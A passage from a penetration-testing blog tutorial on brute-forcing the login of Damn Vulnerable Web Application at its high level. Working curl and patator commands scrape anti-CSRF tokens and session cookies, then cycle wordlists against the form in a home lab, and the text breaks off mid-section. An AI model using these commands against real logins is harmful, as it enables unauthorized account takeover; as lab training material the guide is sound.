---
title: DVWA - Brute Force (High Level) - Anti-CSRF Tokens
url: https://blog.g0tmi1k.com/dvwa/bruteforce-high/
source: Over Security - Cybersecurity news aggregator
date: 2022-10-25
fetch_date: 2025-10-03T20:49:02.719690
---

# DVWA - Brute Force (High Level) - Anti-CSRF Tokens

* [RSS](/atom.xml "subscribe via RSS")

* [Blog](/)
* [Archives](/archives/)

# DVWA - Brute Force (High Level) - Anti-CSRF Tokens

This is the final "how to" guide which brute focuses Damn Vulnerable Web Application (DVWA), this time on the **high security level**. It is an expansion from the ["low" level (which is a straightforward HTTP GET form attack)](https://blog.g0tmi1k.com/dvwa/bruteforce-low/). The [main login screen](https://blog.g0tmi1k.com/dvwa/login/) shares similar issues (brute force-able and with anti-CSRF tokens). The only other posting is the ["medium" security level post (which deals with timing issues)](https://blog.g0tmi1k.com/dvwa/bruteforce-medium/).

![Brute Force DVWA High Level](/images/dvwa-bruteforce-high.png "Brute Force DVWA High Level")

For the final time, let's **pretend we do not know any credentials** for DVWA....

Let's **play dumb and brute force** DVWA... *once and for all!*

---

**TL;DR**: Quick copy/paste

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2) SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7) curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php"  patator  http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=1  timeout=5  --max-retries=0 \   url="http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&password=FILE0&user_token=_CSRF_&Login=Login" \   1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/rockyou-40.txt \   header="Cookie: security=high; PHPSESSID=${SESSIONID}" \   before_urls="http://192.168.1.44/DVWA/vulnerabilities/brute/" \   before_header="Cookie: security=high; PHPSESSID=${SESSIONID}" \   before_egrep="_CSRF_:<input type='hidden' name='user_token' value='(\w+)' />" \   -x quit:fgrep='Welcome to the password protected area' ``` |

---

Table of Contents

* + [Objectives](#Objectives)
  + [Setup](#Setup)
  + [Tools](#Tools)
  + [Creating a Session Cookie](#Creating.a.Session.Cookie)
  + [Information Gathering](#Information.Gathering)
    - [Form HTML Code](#Form.HTML.Code)
    - [CSRF Token Checking](#CSRF.Token.Checking)
    - [Timings](#Timings)
  + [Patator](#Patator)
    - [Patator Documentation](#Patator.Documentation)
    - [**Patator Attack Command**](#L.strong.Patator.Attack.Command..strong.)
  + [**Burp Suite**](#L.strong.Burp.Suite..strong.)
    - [Configure Burp](#Configure.Burp)
    - [Macro](#Macro)
    - [Intruder](#Intruder)
  + [Hydra](#Hydra)
  + [Proof of Concept Scripts](#Proof.of.Concept.Scripts)
    - [Bash Template](#Bash.Template)
    - [Python Template](#Python.Template)
  + [Summary](#Summary)

## Objectives

* The goal is to **brute force an HTTP login** page.
  + **GET requests** are made via a **form**.
  + The web page is in a **sub folder**.
* [Low](https://blog.g0tmi1k.com/dvwa/bruteforce-low/)
  + **Straight forward HTTP GET** brute force attack via a **web form**.
  + Bonus: **SQL injection** (~~[See here for more information](#*comingsoon*)~~).
* [Medium](https://blog.g0tmi1k.com/dvwa/bruteforce-medium/)
  + Extends on the ["low" level](https://blog.g0tmi1k.com/dvwa/bruteforce-low/) - HTTP GET attack via a web form.
  + Adds in a **static time delay** (4 seconds) on failed logins.
* **[High](https://blog.g0tmi1k.com/dvwa/bruteforce-high/)**
  + Extends on the ["low" level](https://blog.g0tmi1k.com/dvwa/bruteforce-low/) - HTTP GET attack via a web form.
  + Uses an **anti Cross-Site Request Forgery (CSRF) token**.
  + This time uses a **random time delay** (between 0 and 4 seconds).
* ~~[Impossible](#comingsoon)~~
  + Submits data via HTTP **POST** via web form
  + **Accounts will lock out** after 5 failed logins.
    - Time delay before becoming unlocked (15 minutes).
    - Unable to enumerate users on the system.
    - Possible **"Denial of Service (DoS)" vector**.
* ~~[PHPIDS](#comingsoon)~~
  + Does not protect against this attack.
  + **All attack methods are still the same!**

---

## Setup

* Main target: [DVWA v1.10](https://github.com/RandomStorm/DVWA/releases) (Running on `Windows Server 2012 Standard ENG x64` + `IIS 8`).
  + Target setup **does not matter too much** for this - `Debian`/`Arch Linux`/`Windows`, `Apache`/`Nginx`/`IIS`, `PHP v5.x`, or `MySQL`/`MariaDB`.
  + The main target is on the IP (`192.168.1.44`), port (`80`) and subfolder (`/DVWA/`), which is known ahead of time.
  + Because the target is Windows, it does not matter about case sensitive URL requests (`/DVWA/` vs `/dvwa/`).
* Attacker: [Kali Linux v2](https://www.kali.org/) (+ [Personal Custom Post-install Script](https://github.com/g0tmi1k/os-scripts/blob/master/kali.sh)).
  + Shell prompt will look different (due to [ZSH](http://www.zsh.org/)/[Oh-My-ZSH](https://github.com/robbyrussell/oh-my-zsh)).
  + Added colour to tools output (thanks to [GRC](https://github.com/garabik/grc)).
  + Pre-installed tools (such as [html2text](http://www.mbayer.de/html2text/)).

Both machines are running inside a Virtual Machine (VMware ESXi).

---

## Tools

* cURL - Information gathering (used for viewing source code & automate generating sessions).
* [Patator v0.7](https://github.com/lanjelot/patator) - A brute force tool.
  + So far, we were using v0.5, however this does not have the `before_header` function. Time to upgrade!
* [Burp Proxy v16.0.1](https://portswigger.net/burp/proxy.html) - Debugging requests & brute force tool
  + Using [FoxyProxy](https://getfoxyproxy.org/) to switch proxy profiles in Iceweasel.
* [SecLists](https://github.com/danielmiessler/SecLists) - General wordlists.
  + These are common, default and small wordlists.
  + Instead of using a custom built wordlist, which has been crafted for our target (e.g. generated with [CeWL](https://digi.ninja/projects/cewl.php)).

---

## Creating a Session Cookie

This was explained back in the first post for the [low level setting](https://blog.g0tmi1k.com/dvwa/bruteforce-low/). Again, this post will be using the [low level](https://blog.g0tmi1k.com/dvwa/bruteforce-low/) posting, and expanding on it. I will not be covering certain parts in depth here, because I already mentioned them in other posts. If a certain area is does not make sense, I strongly suggest you read over the [low security](https://blog.g0tmi1k.com/dvwa/bruteforce-low/) post first (and maybe the [medium](https://blog.g0tmi1k.com/dvwa/bruteforce-medium/) one too).

The cookie command has not changed, plus the target has not changed, which means the output and result will be the same.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` [root:~]# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2) [root:~]# curl -s -b dvwa.cookie --data "username=admin&password=password&user_token=${CSRF}&Login=Login" "http://192.168.1.44/DVWA/login.php" <head><title>Document Moved</title></head> <body><h1>Object Moved</h1>This document may be found <a HREF="index.php">here</a></body># [root:~]# sed -i '/security/d' dvwa.cookie [root:~]# ``` |

![Session Cookie](/images/dvwa-bruteforce-high-01.png)

*Note, depending on the web server and its configuration, [it may respond slightly differently](/images/dvwa-bruteforce-high-02.png) (in the [screenshot](/images/dvwa-bruteforce-high-02.png): `192.168.1.11` is **Nginx**,`192.168.1.22` is **Apache** & `192.168.1.44` is **IIS**). This is a possible method to fingerprint an IIS web server.*

---

## Information Gathering

### Form HTML Code

First thing we need to do is to figure out how this level is different from both of the ones before it (low and medium). We could use DVWA's in-built function to allow us to look at the PHP source code (which is stored on the server), however, let's try and figure it out ourselves as we would be doing if it was any other black box assessment. Using the same comman...